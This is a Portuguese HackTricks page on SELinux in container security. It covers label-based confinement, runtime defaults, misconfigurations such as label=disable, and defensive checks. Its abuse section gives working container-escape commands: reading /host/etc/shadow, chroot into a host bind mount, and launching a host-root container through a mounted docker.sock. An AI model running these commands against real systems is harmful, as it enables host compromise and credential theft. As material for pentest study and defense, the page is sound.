# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## AppArmor Vs SELinux

A diferença geral mais simples é que o AppArmor é baseado em paths, enquanto o SELinux é **baseado em labels**. Isso tem grandes consequências para a segurança de containers. Uma policy baseada em paths pode se comportar de maneira diferente se o mesmo conteúdo do host se tornar visível sob um path de mount inesperado. Uma policy baseada em labels, por outro lado, verifica qual é a label do objeto e o que o domínio do processo pode fazer com ele. Isso não torna o SELinux simples, mas o torna resistente a uma classe de suposições relacionadas a truques com paths que os defensores podem fazer acidentalmente em sistemas baseados em AppArmor.

Como o modelo é orientado a labels, o gerenciamento de volumes de containers e as decisões de relabeling são críticos para a segurança. Se o runtime ou o operador alterar as labels de forma muito abrangente para "fazer os mounts funcionarem", o limite da policy que deveria conter a workload pode se tornar muito mais fraco do que o pretendido.

## Lab

Para verificar se o SELinux está ativo no host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspecionar labels existentes no host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar uma execução normal com uma em que a rotulagem está desabilitada:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Em um host com SELinux habilitado, esta é uma demonstração muito prática porque mostra a diferença entre um workload executado sob o domínio esperado do container e outro que foi despojado dessa camada de enforcement.

## Uso em Runtime

O Podman está particularmente bem alinhado com o SELinux em sistemas nos quais o SELinux faz parte do padrão da plataforma. Podman rootless junto com SELinux é uma das bases de segurança mainstream mais fortes para containers, porque o processo já não tem privilégios no host e ainda está confinado pela política MAC. O Docker também pode usar SELinux quando há suporte, embora administradores às vezes o desabilitem para contornar problemas com a rotulagem de volumes. CRI-O e OpenShift dependem bastante do SELinux como parte de sua estratégia de isolamento de containers. O Kubernetes também pode expor configurações relacionadas ao SELinux, mas seu valor obviamente depende de o sistema operacional do node realmente oferecer suporte e aplicar o SELinux.

A lição recorrente é que o SELinux não é um enfeite opcional. Nos ecossistemas construídos em torno dele, ele faz parte do limite de segurança esperado.

## Misconfigurações

O erro clássico é `label=disable`. Operacionalmente, isso costuma acontecer porque uma montagem de volume foi negada e a resposta rápida de curto prazo foi remover o SELinux da equação em vez de corrigir o modelo de rotulagem. Outro erro comum é a relabeling incorreta de conteúdo do host. Operações amplas de relabel podem fazer a aplicação funcionar, mas também podem expandir muito além do planejado originalmente aquilo que o container tem permissão para acessar.

Também é importante não confundir o SELinux **instalado** com o SELinux **efetivo**. Um host pode oferecer suporte ao SELinux e ainda estar em modo permissive, ou o runtime pode não estar iniciando o workload sob o domínio esperado. Nesses casos, a proteção é muito mais fraca do que a documentação pode sugerir.

## Abuso

Quando o SELinux está ausente, em modo permissive ou amplamente desabilitado para o workload, os caminhos montados do host se tornam muito mais fáceis de abusar. O mesmo bind mount que, de outra forma, seria restringido por labels pode se tornar uma via direta para acessar dados do host ou modificá-lo. Isso é especialmente relevante quando combinado com montagens de volumes com permissão de escrita, diretórios do container runtime ou atalhos operacionais que expõem caminhos sensíveis do host por conveniência.

O SELinux frequentemente explica por que um writeup genérico de breakout funciona imediatamente em um host, mas falha repetidamente em outro, mesmo quando as flags do runtime parecem semelhantes. O ingrediente ausente muitas vezes não é um namespace ou uma capability, mas um limite de labels que permaneceu intacto.

A verificação prática mais rápida é comparar o contexto ativo e, em seguida, testar os caminhos montados do host ou os diretórios do runtime que normalmente seriam confinados por labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se um host bind mount estiver presente e a rotulagem do SELinux tiver sido desativada ou enfraquecida, a divulgação de informações geralmente vem primeiro:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se o mount for gravável e o container for efetivamente host-root do ponto de vista do kernel, o próximo passo é testar uma modificação controlada no host em vez de fazer suposições:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Em hosts compatíveis com SELinux, a perda de labels ao redor dos diretórios de estado de runtime também pode expor caminhos diretos de privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Esses comandos não substituem uma cadeia completa de escape, mas deixam claro rapidamente se o SELinux era o que impedia o acesso aos dados do host ou a modificação de arquivos no host.

### Exemplo completo: SELinux desabilitado + montagem do host com permissão de escrita

Se a rotulagem do SELinux estiver desabilitada e o sistema de arquivos do host estiver montado com permissão de escrita em `/host`, um escape completo do host se torna um caso comum de abuso de bind mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se o `chroot` for bem-sucedido, o processo do container agora está operando a partir do sistema de arquivos do host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemplo Completo: SELinux Desabilitado + Diretório de Runtime

Se o workload puder alcançar um socket de runtime quando os labels estiverem desabilitados, o escape poderá ser delegado ao runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
A observação relevante é que o SELinux frequentemente era o controle que impedia exatamente esse tipo de acesso a caminhos do host ou ao estado de runtime.

## Verificações

O objetivo das verificações do SELinux é confirmar que o SELinux está habilitado, identificar o contexto de segurança atual e verificar se os arquivos ou caminhos de seu interesse estão realmente confinados por labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
O que é interessante aqui:

- `getenforce` deve idealmente retornar `Enforcing`; `Permissive` ou `Disabled` altera o significado de toda a seção sobre SELinux.
- Se o contexto do processo atual parecer inesperado ou amplo demais, a workload pode não estar sendo executada sob a política de container pretendida.
- Se os arquivos montados do host ou os diretórios de runtime tiverem labels aos quais o processo pode acessar livremente, os bind mounts se tornam muito mais perigosos.

Ao revisar um container em uma plataforma compatível com SELinux, não trate o labeling como um detalhe secundário. Em muitos casos, ele é uma das principais razões pelas quais o host ainda não foi comprometido.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Dependente do host | A separação do SELinux está disponível em hosts com SELinux habilitado, mas o comportamento exato depende da configuração do host/daemon | `--security-opt label=disable`, relabeling amplo de bind mounts, `--privileged` |
| Podman | Normalmente habilitado em hosts com SELinux | A separação do SELinux é uma parte normal do Podman em sistemas com SELinux, a menos que seja desabilitada | `--security-opt label=disable`, `label=false` em `containers.conf`, `--privileged` |
| Kubernetes | Geralmente não atribuído automaticamente no nível do Pod | O suporte ao SELinux existe, mas os Pods normalmente precisam de `securityContext.seLinuxOptions` ou de padrões específicos da plataforma; o suporte do runtime e do node é necessário | `seLinuxOptions` fracos ou amplos, execução em nodes permissivos/desabilitados, políticas da plataforma que desabilitam o labeling |
| CRI-O / implantações no estilo OpenShift | Normalmente usado intensivamente | O SELinux costuma ser uma parte central do modelo de isolamento do node nesses ambientes | políticas personalizadas que ampliam excessivamente o acesso, desabilitação do labeling por motivos de compatibilidade |

Os padrões do SELinux dependem mais da distribuição do que os padrões do seccomp. Em sistemas no estilo Fedora/RHEL/OpenShift, o SELinux costuma ser central para o modelo de isolamento. Em sistemas sem SELinux, ele simplesmente está ausente.
{{#include ../../../../banners/hacktricks-training.md}}
